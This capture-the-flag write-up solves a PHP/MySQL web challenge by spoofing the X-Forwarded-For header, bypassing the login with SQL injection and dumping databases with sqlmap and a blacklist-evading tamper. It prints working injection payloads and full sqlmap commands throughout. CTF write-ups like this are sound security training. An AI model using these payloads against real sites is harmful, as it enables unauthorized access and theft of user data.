<h1>Clubmouse</h1>

<p>We are presented with a PHP webpage. There is a <code>login.php</code>, but it gives us a 403 Forbidden error. Looking a little deeper into <code>gallery.php</code> shows us that some of the pictures of the devices include internal subnet addresses.</p>

<p><img src="../../.gitbook/assets/image (14).png" alt="" /></p>

<p><img src="../../.gitbook/assets/image (15).png" alt="" /></p>

<p>One way that the login page might be filtering requests is by the user's IP address. The <code>X-Forwarded-For</code> header is used for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. </p>

<p>However, it can also be easily changed by the client. By running a Burp Suite Intruder scan for the request header<code>X-Forwarded-For: 192.168.3.x</code>, where <code>x</code> is the payload, we see that by setting the <code>X-Forwarded-For</code> header to <code>192.168.3.16</code>, we gain access to the login page.</p>

<p><img src="../../.gitbook/assets/image (16).png" alt="" /></p>

<p>We see a form with <code>username</code> and <code>password</code> fields. Using <code>'</code> in username parameter leads to the following output:</p>

<p>```markup</p>

<h4 style='color: red;' class='text-center'>There is a sql error, Call the administrator!</h4>

<p>```</p>

<p>We have identified an SQL injection vulnerability. By using the following payload, we can bypass the authentication.</p>

<p><code>
username=test&amp;password=test' or 1=1 LIMIT 1;#
</code></p>

<p>Once logged in as the admin, we have access to a <code>users.php</code> page. This page contains usernames and card numbers.</p>

<p><code>markup
&lt;tbody&gt;
   &lt;tr&gt;
      &lt;th scope="row"&gt;1&lt;/th&gt;
      &lt;td&gt;melo&lt;/td&gt;
      &lt;td&gt;1457888555215515&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;th scope="row"&gt;2&lt;/th&gt;
      &lt;td&gt;john&lt;/td&gt;
      &lt;td&gt;99888515654864655&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;th scope="row"&gt;3&lt;/th&gt;
      &lt;td&gt;admin&lt;/td&gt;
      &lt;td&gt;85551496165161665&lt;/td&gt;
   &lt;/tr&gt;
&lt;/tbody&gt;
</code></p>

<p>This page must also be fetching the user information through the database, so we tested for additional SQL injection endpoints. </p>

<p>We found that <code>/users.php?id=1</code> returns only the data for user ID 1. Fuzzing the input leads us to discover that this is a second SQL injection endpoint. This time, there is a blacklist filter:</p>

<p>```markup</p>

<script>alert('Bad character/word ditected!');</script>

<p>```</p>

<p>Using SQLMap, we get the following injection vectors:</p>

<h2>```</h2>

<p>Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 5928=5928 AND ('bLIm'='bLIm</p>

<pre><code>Type: time-based blind
Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=1') AND (SELECT 2847 FROM (SELECT(SLEEP(5)))MMVq) AND ('pklt'='pklt

Type: UNION query
Title: Generic UNION query (NULL) - 4 columns
</code></pre>

<h2>    Payload: id=1') UNION ALL SELECT NULL,CONCAT(0x7170786a71,0x4a6d4669536b6565767a724d666e776b46517a7853774374787154644d49664b664b565242485172,0x7171787171),NULL,NULL-- -</h2>

<p>```</p>

<p><code>sqlmap -r get.req --threads 10 --dbms mysql --dump --no-escape --tamper=between</code> dumps the database.</p>

<p><code>
Database: users_data
Table: data
[3 entries]
+----+-------+-------------------+-----------+
| id | user  | card_num          | R34L_F14G |
+----+-------+-------------------+-----------+
| 1  | melo  | 1457888555215515  | &lt;blank&gt;   |
| 2  | john  | 99888515654864655 | &lt;blank&gt;   |
| 3  | admin | 85551496165161665 | &lt;blank&gt;   |
+----+-------+-------------------+-----------+
</code></p>

<p><code>
Database: login_users
Table: users
[1 entry]
+----+-----------------------------+----------+---------------------+
| id | password                    | username | created_at          |
+----+-----------------------------+----------+---------------------+
| 1  | R34ly_h4rd_p@ssw0rd_t0_f1nd | admin    | 2021-07-13 03:15:21 |
+----+-----------------------------+----------+---------------------+
</code></p>

<p>We see that there is a <code>R34L_F14G</code> column, but it is returning us <code>&lt;blank&gt;</code> results. I looked deeper into the SQLMap queries, and found that the following query is used to retrieve the column values.</p>

<p><code>GET /users.php?id=1%27)%20UNION%20ALL%20SELECT%20NULL,CONCAT(%27qzppq%27,JSON_ARRAYAGG(CONCAT_WS(%27kbxmel%27,card_num)),%27qpbzq%27),NULL,NULL%20FROM%20users_data.data%20ORDER%20BY%20card_num--%20-</code></p>

<p>Replacing <code>card_num</code> with <code>R34L_F14G</code> fails the blacklist filter, so SQLMap was unable to retrieve any results.</p>

<p>Remember <code>login.php</code> from earlier? It did not filter <code>R34L_F14G</code>, but it does have an SQL injection vector too. It was a blind SQL injection, so retrieving information from the database would be time-based and it would have been too slow to dump the entire database. </p>

<p>However, by specifying the specific table and column to dump, we got our results much faster.</p>

<p><code>sqlmap -u http://challenges.ctfd.io:30232/login.php --headers=“X-Forwarded-For: 192.168.3.16” --data “password=1&amp;username=test” --dbms=mysql --tamper=between -D users_data -T data -C R34L_F14G --dump --where “id=3”</code></p>

<p>This gave us the flag, <code>S3D{G0_De3Per_L1k3_a_pr0_r3d_T3aMEr}</code>.</p>
